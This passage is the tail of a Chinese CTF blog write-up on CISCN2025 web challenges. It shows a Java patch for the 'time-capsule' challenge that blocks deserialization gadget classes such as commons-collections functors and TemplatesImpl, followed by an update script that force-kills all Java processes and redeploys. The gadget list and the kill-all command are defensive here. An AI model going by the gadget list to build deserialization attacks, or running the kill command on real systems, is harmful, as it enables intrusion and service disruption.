class="line">                <span class="string">&quot;java.security.SignedObject&quot;</span>,</span><br><span class="line">                <span class="string">&quot;org.apache.commons.collections.functors&quot;</span>,</span><br><span class="line">                <span class="string">&quot;org.apache.commons.collections.Transformer&quot;</span>,</span><br><span class="line">                <span class="string">&quot;com.h2&quot;</span>,</span><br><span class="line">                <span class="string">&quot;com.h2database&quot;</span>,</span><br><span class="line">                <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span></span><br><span class="line">        &#125;)&#123;</span><br><span class="line">            <span class="keyword">if</span>(desc.getName().startsWith(deny))&#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;Unauthorized ClassName &quot;</span> + desc.getName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!desc.getName().startsWith(<span class="string">&quot;com.ctf.&quot;</span>) &amp;&amp; !desc.getName().startsWith(<span class="string">&quot;java.&quot;</span>) &amp;&amp; !desc.getName().equals(<span class="string">&quot;[B&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;Unauthorized class deserialization&quot;</span>, desc.getName());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(desc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>或者删掉com.ctf.util.FieldGetterHandler类即可</p>
<p>然后update.sh：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">mv</span> TimeCapsule-1.0.jar /app/TimeCapsule-1.0.jar</span><br><span class="line">ps -ef | grep java | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs <span class="built_in">kill</span> -9</span><br><span class="line">java -jar /app/TimeCapsule-1.0.jar</span><br></pre></td></tr></table></figure>

<h2 id="bookstore"><a href="#bookstore" class="headerlink" title="bookstore"></a>bookstore</h2><p>见<a href="https://sakuraraindrop.github.io/2025/06/26/2025%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E4%BA%91%E5%A4%8D%E7%9B%98/">https://sakuraraindrop.github.io/2025/06/26/2025%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E4%BA%91%E5%A4%8D%E7%9B%98/</a></p>
<h2 id="Deprecated"><a href="#Deprecated" class="headerlink" title="Deprecated"></a>Deprecated</h2><p>见<a href="https://sakuraraindrop.github.io/2025/06/26/2025%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E4%BA%91%E5%A4%8D%E7%9B%98/">https://sakuraraindrop.github.io/2025/06/26/2025%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E4%BA%91%E5%A4%8D%E7%9B%98/</a></p>
<!-- flag of hidden posts --></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://sakuraraindrop.github.io">cheng_xing</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://sakuraraindrop.github.io/2025/07/17/CISCN2025-Web%E7%AA%81%E5%87%BB/">https://sakuraraindrop.github.io/2025/07/17/CISCN2025-Web%E7%AA%81%E5%87%BB/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://sakuraraindrop.github.io" target="_blank">cheng_xing's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ssti/">ssti</a><a class="post-meta__tags" href="/tags/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">pickle反序列化</a><a class="post-meta__tags" href="/tags/django/">django</a><a class="post-meta__tags" href="/tags/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/">python格式化字符串漏洞</a><a class="post-meta__tags" href="/tags/RS256%E5%BC%B1%E5%85%AC%E9%92%A5jwt%E4%BC%AA%E9%80%A0/">RS256弱公钥jwt伪造</a><a class="post-meta__tags" href="/tags/nodejs%E5%BC%B1%E6%AF%94%E8%BE%83/">nodejs弱比较</a><a class="post-meta__tags" href="/tags/java/">java</a><a class="post-meta__tags" href="/tags/Beetl%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">Beetl模板注入</a></div><div class="post-share"><div class="social-share" data-image="/img/ltx.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related no-desc" href="/2025/06/26/2025%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E4%BA%91%E5%A4%8D%E7%9B%98/" title="2025长城杯决赛部分题目云复盘"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-26</div><div class="info-item-2">2025长城杯决赛部分题目云复盘</div></div></div></a><a class="pagination-related no-desc" href="/2025/07/09/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B%E5%A4%8D%E7%8E%B0/" title="2024春秋杯冬季赛复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-09</div><div class="info-item-2">2024春秋杯冬季赛复现</div></div></div></a><a class="pagination-related no-desc" href="/2025/07/11/20250711%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/" title="20250711随缘刷题"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-11</div><div class="info-item-2">20250711随缘刷题</div></div></div></a><a class="pagination-related no-desc" href="/2025/04/04/XYCTF2025/" title="XYCTF2025"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-04</div><div class="info-item-2">XYCTF2025</div></div></div></a><a class="pagination-related no-desc" href="/2025/05/08/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="python反序列化"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-08</div><div class="info-item-2">python反序列化</div></div></div></a><a class="pagination-related no-desc" href="/2025/04/30/%E7%8E%84%E6%9C%BAweb/" title="玄机web"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-30</div><div class="info-item-2">玄机web</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/ltx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">cheng_xing</div><div class="author-info-description">web菜鸡修炼中</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">44</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">118</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/sakuraraindrop"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/sakuraraindrop" target="_blank" title="Github"><i class="fab fa-github" style="color: #hdhfbb;"></i></a><a class="social-icon" href="https://space.bilibili.com/504596197" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #000000;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ezjs"><span class="toc-number">1.</span> <span class="toc-text">ezjs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ShareCard"><span class="toc-number">2.</span> <span class="toc-text">ShareCard</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SolonMaster"><span class="toc-number">3.</span> <span class="toc-text">SolonMaster</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fobee"><span class="toc-number">4.</span> <span class="toc-text">Fobee</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ccforum"><span class="toc-number">5.</span> <span class="toc-text">ccforum</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rng-assistant"><span class="toc-number">6.</span> <span class="toc-text">rng-assistant</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Django-Blog"><span class="toc-number">7.</span> <span class="toc-text">Django-Blog</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#time-capsule"><span class="toc-number">8.</span> <span class="toc-text">time-capsule</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bookstore"><span class="toc-number">9.</span> <span class="toc-text">bookstore</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Deprecated"><span class="toc-number">10.</span> <span class="toc-text">Deprecated</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/08/29/TFCCTF-2025/" title="TFCCTF-2025">TFCCTF-2025</a><time datetime="2025-08-29T10:17:49.000Z" title="发表于 2025-08-29 18:17:49">2025-08-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/08/24/HITCON-2025/" title="HITCON-2025">HITCON-2025</a><time datetime="2025-08-24T15:17:38.000Z" title="发表于 2025-08-24 23:17:38">2025-08-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/08/17/sekaiCTF-2025/" title="sekaiCTF-2025">sekaiCTF-2025</a><time datetime="2025-08-16T17:00:26.000Z" title="发表于 2025-08-17 01:00:26">2025-08-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/08/17/LilCTF/" title="LilCTF">LilCTF</a><time datetime="2025-08-16T17:00:13.000Z" title="发表于 2025-08-17 01:00:13">2025-08-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/15/JDK%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/" title="JDK动态代理">JDK动态代理</a><time datetime="2025-07-15T15:04:34.000Z" title="发表于 2025-07-15 23:04:34">2025-07-15</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/hk.jpg);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By cheng_xing</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.0-b1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>